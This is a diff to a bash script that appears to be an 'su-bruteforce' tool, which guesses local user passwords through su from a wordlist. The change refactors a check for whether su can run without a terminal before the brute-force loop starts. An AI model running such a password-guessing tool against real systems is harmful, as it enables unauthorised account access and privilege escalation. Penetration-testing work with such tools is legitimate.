@@ -28,11 +28,6 @@ if ! [ "$USER" ]; then printf "$help"; exit 0; fi
 
 if ! [[ -p /dev/stdin ]] && ! [ $WORDLIST = "-" ] && ! [ -f "$WORDLIST" ]; then echo "Wordlist ($WORDLIST) not found!"; exit 0; fi
 
-if [[ `echo '' | timeout $TIMEOUTPROC su $USER -c whoami 2>&1` == "su: must be run from a terminal" ]]; then 
-  echo "  Error: su must be run from a terminal, su-bruteforce cannot be used against this OS"
-  exit 0
-fi
-
 C=$(printf '\033')
 
 su_try_pwd (){
@@ -67,5 +62,20 @@ su_brute_user_num (){
   wait
 }
 
-su_brute_user_num $USER
+check_if_su_brute(){
+  EXISTS_SU="$(command -v su 2>/dev/null)"
+  error=$(echo "" | timeout 1 su $(whoami) -c whoami 2>&1);
+  if [ "$EXISTS_SU" ] && ! echo $error | grep -q "must be run from a terminal"; then
+    echo "1"
+  fi
+}
+
+POSSIBE_SU_BRUTE=$(check_if_su_brute);
+if [ "$POSSIBE_SU_BRUTE" ]; then
+  su_brute_user_num $USER
+else
+  echo "  It's not possible to brute-force su."
+  exit 0;
+fi
+
 echo "  Wordlist exhausted" | sed "s,.*,${C}[1;31;107m&${C}[0m,"
